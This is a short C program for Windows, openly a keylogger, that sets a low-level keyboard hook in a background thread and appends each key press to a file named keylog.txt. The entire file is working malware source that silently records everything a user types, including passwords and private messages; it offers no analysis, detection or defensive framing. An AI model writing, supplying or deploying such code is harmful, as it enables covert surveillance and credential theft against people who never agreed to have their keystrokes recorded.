#include <stdio.h>
#include <windows.h>

HHOOK hHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
            FILE *file = fopen("keylog.txt", "a+");
            if (file) {
                fprintf(file, "%c", p->vkCode);
                fclose(file);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL); // Current Instance of exe.
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0); //Low level keyboard hook, triggering KeyboardProc in the current instance.
    MSG msg; //msg object
    while (GetMessage(&msg, NULL, 0, 0)) { // Obtain message in the thread message queue
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}

int main() {
    HANDLE hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    return 0;
}
